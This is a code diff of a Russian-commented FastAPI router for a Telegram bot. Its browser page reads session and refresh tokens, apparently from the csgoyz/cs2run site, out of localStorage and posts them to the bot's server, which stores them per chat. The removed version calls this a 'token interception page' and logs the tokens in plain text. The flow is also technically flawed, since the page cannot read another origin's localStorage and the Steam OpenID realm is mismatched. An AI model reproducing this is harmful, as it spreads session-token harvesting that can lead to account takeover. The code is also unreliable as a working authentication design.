@@ -1,89 +1,72 @@
-from fastapi import APIRouter, Request, Query
-from fastapi.responses import HTMLResponse, RedirectResponse
+from fastapi import APIRouter, Request
+from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
 import urllib.parse
-import json
 
 from main import RAM_DATA
 
 router = APIRouter()
+
 SELF_URL = "https://tg-bot-test-gkbp.onrender.com"
 
-# ============================================================
-# 1️⃣ Точка входа для пользователя
-# ============================================================
-import httpx
+# 1️⃣ Кнопка входа для пользователя
 @router.get("/auth/login")
 async def auth_login(chat_id: int):
     return_url = f"{SELF_URL}/auth/callback?chat_id={chat_id}"
-    api_url = f"https://cs2run.app/auth/1/get-url/?return_url={urllib.parse.quote(return_url)}"
+    steam_login = (
+        "https://steamcommunity.com/openid/login"
+        "?openid.ns=http://specs.openid.net/auth/2.0"
+        "&openid.mode=checkid_setup"
+        "&openid.claimed_id=http://specs.openid.net/auth/2.0/identifier_select"
+        "&openid.identity=http://specs.openid.net/auth/2.0/identifier_select"
+        f"&openid.return_to={urllib.parse.quote(return_url)}"
+        "&openid.realm=https://steamcommunity.com"
+    )
+    return RedirectResponse(steam_login)
 
-    async with httpx.AsyncClient() as client:
-        r = await client.get(api_url)
-        data = r.json()
 
-    steam_url = data["data"]["url"]
-
-    return RedirectResponse(steam_url)
-
-# ============================================================
-# 2️⃣ Страница перехвата токенов (уже после csgoyz.run)
-# ============================================================
-
+# 2️⃣ Страница после Steam
 @router.get("/auth/callback")
-async def auth_callback(chat_id: int = Query(...)):
-    """
-    Эта страница открывается в браузере пользователя.
-    Ждёт, пока csgoyz.run запишет токены в localStorage.
-    """
+async def auth_callback(chat_id: int):
     return HTMLResponse(f"""
 <!DOCTYPE html>
 <html>
-<head><title>Авторизация…</title></head>
 <body>
-<h3>🔐 Завершаем вход…</h3>
+<h3>Авторизация завершена</h3>
 
 <script>
 (async () => {{
-    function sleep(ms) {{ return new Promise(r => setTimeout(r, ms)); }}
+    // ждем пока csgoyz создаст токены
+    await new Promise(r => setTimeout(r, 1500));
 
-    for (let i = 0; i < 60; i++) {{
-        const token = localStorage.getItem("auth-token");
-        const refresh = localStorage.getItem("auth-refresh-token");
+    const access = localStorage.getItem("auth-token");
+    const refresh = localStorage.getItem("auth-refresh-token");
 
-        if (token && refresh) {{
-            await fetch("{SELF_URL}/bot/receive?chat_id={chat_id}", {{
-                method: "POST",
-                headers: {{ "Content-Type": "application/json" }},
-                body: JSON.stringify({{ token, refresh }})
-            }});
-
-            document.body.innerHTML = "<h3>✅ Вход выполнен. Можно закрыть окно.</h3>";
-            if (window.Telegram?.WebApp) Telegram.WebApp.close();
-            return;
-        }}
-
-        await sleep(300);
+    if (!access || !refresh) {{
+        document.body.innerHTML = "❌ Токены не найдены";
+        return;
     }}
 
-    document.body.innerHTML = "<h3>❌ Не удалось получить токены</h3>";
+    await fetch("/auth/save?chat_id={chat_id}", {{
+        method: "POST",
+        headers: {{ "Content-Type": "application/json" }},
+        body: JSON.stringify({{ access, refresh }})
+    }});
+
+    document.body.innerHTML = "✅ Готово! Можешь закрыть окно.";
 }})();
 </script>
 </body>
 </html>
 """)
 
-# ============================================================
-# 3️⃣ Сервер принимает токены
-# ============================================================
 
-@router.post("/bot/receive")
-async def receive_tokens(chat_id: int, payload: dict):
-    if chat_id not in RAM_DATA:
-        RAM_DATA[chat_id] = {}
+# 3️⃣ Прием токенов от браузера
+@router.post("/auth/save")
+async def save_tokens(request: Request, chat_id: int):
+    data = await request.json()
 
-    RAM_DATA[chat_id]["access_token"] = payload["token"]
-    RAM_DATA[chat_id]["refresh_token"] = payload["refresh"]
+    RAM_DATA.setdefault(chat_id, {})
+    RAM_DATA[chat_id]["access_token"] = data["access"]
+    RAM_DATA[chat_id]["refresh_token"] = data["refresh"]
 
-    print(f"\n🔥 TOKENS FOR {chat_id}:\n{json.dumps(payload, indent=2)}\n")
-
-    return {"ok": True}
+    return JSONResponse({"ok": True})
